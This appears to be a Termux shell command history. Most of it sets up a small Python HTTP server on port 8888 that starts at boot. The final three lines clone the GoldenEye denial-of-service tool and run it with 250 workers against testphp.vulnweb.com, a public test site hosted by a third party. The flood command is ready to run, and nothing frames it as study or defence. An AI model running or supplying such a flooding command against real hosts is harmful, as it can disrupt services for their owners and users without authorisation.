ps aux | grep python
mkdir -p ~/mysite
cd ~/mysite
nano index.html
mkdir -p ~/.termux/boot
nano ~/.termux/boot/start-server.sh
chmod +x ~/.termux/boot/start-server.sh
ls -l ~/.termux/boot/start-server.sh
nano ~/.termux/boot/start-server.sh
nohup python -m http.server 8888 > /dev/null 2>&1 &
nano ~/.termux/boot/start-server.sh
git clone https://github.com/jseidl/GoldenEye
cd GoldenEye
python3 goldeneye.py http://testphp.vulnweb.com -w 250 -s 10
